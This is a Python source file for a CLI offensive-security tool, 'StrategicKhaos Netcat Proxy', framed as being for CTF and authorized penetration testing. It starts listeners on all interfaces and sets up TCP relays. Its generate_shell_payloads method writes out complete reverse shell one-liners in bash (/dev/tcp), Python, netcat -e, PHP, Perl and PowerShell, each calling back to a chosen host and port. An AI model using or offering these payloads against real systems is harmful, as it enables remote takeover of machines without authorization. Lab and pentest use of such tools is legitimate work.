#!/usr/bin/env python3
"""
StrategicKhaos Netcat Proxy - Sovereign Network Operations

A netcat-style proxy tool for CTF and penetration testing operations.
"""

import socket
import threading
import sys
import os
from typing import Optional
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt

console = Console()


class NetcatProxy:
    """Netcat proxy for reverse shells, relays, and network operations."""

    def __init__(self):
        """Initialize netcat proxy."""
        self.listeners = {}
        self.relays = {}

    def listen(self, port: int, shell_type: str = "reverse"):
        """
        Start a listener on specified port.
        
        Args:
            port: Port to listen on
            shell_type: Type of shell ('reverse' or 'bind')
        
        Security Note:
            Binds to 0.0.0.0 (all interfaces) for maximum compatibility in CTF/pentest environments.
            For production use, bind to specific interface (e.g., '127.0.0.1' or specific IP).
            Always use in authorized testing environments only.
        """
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Binding to all interfaces (0.0.0.0) - intentional for pentest tool
            server_socket.bind(('0.0.0.0', port))
            server_socket.listen(5)
            
            self.listeners[port] = {
                'socket': server_socket,
                'type': shell_type,
                'thread': None
            }
            
            console.print(f"[green][+][/green] Listener started on port {port} ({shell_type} shell)")
            
            # Start listener thread
            thread = threading.Thread(target=self._handle_listener, args=(port,), daemon=True)
            thread.start()
            self.listeners[port]['thread'] = thread
            
        except Exception as e:
            console.print(f"[red]✗[/red] Failed to start listener: {e}")

    def _handle_listener(self, port: int):
        """Handle incoming connections on listener."""
        server_socket = self.listeners[port]['socket']
        
        while True:
            try:
                client_socket, client_address = server_socket.accept()
                console.print(f"[green][+][/green] Connection received from {client_address[0]}:{client_address[1]}")
                
                # Handle the connection in a new thread
                thread = threading.Thread(
                    target=self._handle_client,
                    args=(client_socket, client_address),
                    daemon=True
                )
                thread.start()
                
            except Exception as e:
                console.print(f"[red]✗[/red] Listener error: {e}")
                break

    def _handle_client(self, client_socket, client_address):
        """
        Handle client connection.
        
        NOTE: Current implementation provides basic echo functionality.
        For production shell handling, implement proper PTY allocation:
        - Use pty.openpty() for pseudo-terminal
        - Handle terminal modes and window size
        - Implement proper input/output buffering
        - Add session management and logging
        """
        try:
            # Simple echo back for demonstration - production needs full PTY handling
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                console.print(f"[cyan]Received:[/cyan] {data.decode('utf-8', errors='ignore')}")
                client_socket.send(data)
        except Exception as e:
            console.print(f"[yellow]Connection closed: {e}[/yellow]")
        finally:
            client_socket.close()

    def relay(self, local_port: int, remote_host: str, remote_port: int):
        """
        Create a relay from local port to remote host:port.
        
        Args:
            local_port: Local port to listen on
            remote_host: Remote host to forward to
            remote_port: Remote port to forward to
        
        Security Note:
            Binds to 0.0.0.0 (all interfaces) for maximum compatibility in CTF/pentest environments.
            For production use, bind to specific interface (e.g., '127.0.0.1' or specific IP).
            Always use in authorized testing environments only.
        """
        try:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            # Binding to all interfaces (0.0.0.0) - intentional for pentest tool
            server_socket.bind(('0.0.0.0', local_port))
            server_socket.listen(5)
            
            self.relays[local_port] = {
                'socket': server_socket,
                'remote_host': remote_host,
                'remote_port': remote_port,
                'thread': None
            }
            
            console.print(f"[green][+][/green] Relay created: localhost:{local_port} → {remote_host}:{remote_port}")
            
            # Start relay thread
            thread = threading.Thread(target=self._handle_relay, args=(local_port,), daemon=True)
            thread.start()
            self.relays[local_port]['thread'] = thread
            
        except Exception as e:
            console.print(f"[red]✗[/red] Failed to create relay: {e}")

    def _handle_relay(self, local_port: int):
        """Handle relay connections."""
        relay_data = self.relays[local_port]
        server_socket = relay_data['socket']
        remote_host = relay_data['remote_host']
        remote_port = relay_data['remote_port']
        
        while True:
            try:
                client_socket, client_address = server_socket.accept()
                console.print(f"[green][+][/green] Relay connection from {client_address[0]}:{client_address[1]}")
                
                # Connect to remote
                remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                remote_socket.connect((remote_host, remote_port))
                
                # Start bidirectional forwarding
                thread1 = threading.Thread(
                    target=self._forward_data,
                    args=(client_socket, remote_socket, "client->remote"),
                    daemon=True
                )
                thread2 = threading.Thread(
                    target=self._forward_data,
                    args=(remote_socket, client_socket, "remote->client"),
                    daemon=True
                )
                
                thread1.start()
                thread2.start()
                
            except Exception as e:
                console.print(f"[red]✗[/red] Relay error: {e}")
                break

    def _forward_data(self, source, destination, label):
        """Forward data between sockets."""
        try:
            while True:
                data = source.recv(4096)
                if not data:
                    break
                destination.send(data)
        except Exception as e:
            console.print(f"[yellow]{label} closed: {e}[/yellow]")
        finally:
            try:
                source.close()
                destination.close()
            except Exception:
                # Silently ignore close errors as sockets may already be closed
                pass

    def generate_shell_payloads(self, lhost: str, lport: int):
        """
        Generate reverse shell payloads.
        
        Args:
            lhost: Listening host IP
            lport: Listening port
        """
        payloads = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'python': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'nc': f"nc -e /bin/bash {lhost} {lport}",
            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            'powershell': f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""
        }
        
        console.print(f"\n[bold]🐚 Reverse Shell Payloads for {lhost}:{lport}:[/bold]\n")
        
        for lang, payload in payloads.items():
            console.print(f"[cyan][{lang}][/cyan]")
            console.print(f"[green]{payload}[/green]\n")

    def list_active(self):
        """List active listeners and relays."""
        console.print("\n[bold]Active Listeners:[/bold]")
        if self.listeners:
            for port, data in self.listeners.items():
                console.print(f"  [cyan]Port {port}:[/cyan] {data['type']} shell")
        else:
            console.print("  [yellow]None[/yellow]")
        
        console.print("\n[bold]Active Relays:[/bold]")
        if self.relays:
            for port, data in self.relays.items():
                console.print(f"  [cyan]Port {port}:[/cyan] → {data['remote_host']}:{data['remote_port']}")
        else:
            console.print("  [yellow]None[/yellow]")

    def run_cli(self):
        """Run interactive CLI."""
        console.print(Panel.fit(
            "[bold cyan]STRATEGICKHAOS NETCAT PROXY v1.0[/bold cyan]\n"
            "[green]Sovereign Network Operations[/green]",
            border_style="cyan"
        ))
        console.print()
        console.print("[dim]Commands: listen, relay, shells, list, exit, help[/dim]")
        console.print()
        
        while True:
            try:
                user_input = Prompt.ask("\n[bold cyan]nc[/bold cyan]>").strip()
                
                if not user_input:
                    continue
                
                # Parse command
                parts = user_input.split()
                command = parts[0].lower()
                
                if command in ['exit', 'quit', 'q']:
                    console.print("[yellow]Exiting Netcat Proxy...[/yellow]")
                    break
                
                elif command == 'help':
                    self._show_help()
                
                elif command == 'list':
                    self.list_active()
                
                elif command == 'listen':
                    if len(parts) < 2:
                        console.print("[yellow]Usage: listen <port> [reverse|bind][/yellow]")
                        continue
                    
                    try:
                        port = int(parts[1])
                        shell_type = parts[2] if len(parts) > 2 else "reverse"
                        self.listen(port, shell_type)
                    except ValueError:
                        console.print("[red]Invalid port number[/red]")
                
                elif command == 'relay':
                    if len(parts) < 4:
                        console.print("[yellow]Usage: relay <local_port> <remote_host> <remote_port>[/yellow]")
                        continue
                    
                    try:
                        local_port = int(parts[1])
                        remote_host = parts[2]
                        remote_port = int(parts[3])
                        self.relay(local_port, remote_host, remote_port)
                    except ValueError:
                        console.print("[red]Invalid port number[/red]")
                
                elif command == 'shells':
                    if len(parts) < 3:
                        console.print("[yellow]Usage: shells <lhost> <lport>[/yellow]")
                        continue
                    
                    try:
                        lhost = parts[1]
                        lport = int(parts[2])
                        self.generate_shell_payloads(lhost, lport)
                    except ValueError:
                        console.print("[red]Invalid port number[/red]")
                
                else:
                    console.print(f"[red]Unknown command: {command}[/red]")
                    console.print("[dim]Type 'help' for available commands[/dim]")
            
            except KeyboardInterrupt:
                console.print("\n[yellow]Use 'exit' to quit[/yellow]")
            except EOFError:
                break

    def _show_help(self):
        """Display help information."""
        help_text = """
[bold]Available Commands:[/bold]

  [cyan]listen <port> [type][/cyan]               - Start listener (type: reverse|bind)
  [cyan]relay <local> <remote_host> <remote>[/cyan] - Create port relay
  [cyan]shells <lhost> <lport>[/cyan]             - Generate reverse shell payloads
  [cyan]list[/cyan]                               - List active listeners and relays
  [cyan]help[/cyan]                               - Show this help message
  [cyan]exit[/cyan]                               - Exit Netcat Proxy

[bold]Examples:[/bold]

  nc> listen 4444 reverse
  nc> shells 10.10.14.5 4444
  nc> relay 8080 10.10.10.5 80
  nc> list
"""
        console.print(Panel(help_text, title="[bold]Netcat Proxy Help[/bold]", border_style="cyan"))


def main():
    """Main entry point."""
    try:
        proxy = NetcatProxy()
        proxy.run_cli()
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        sys.exit(1)


if __name__ == "__main__":
    main()
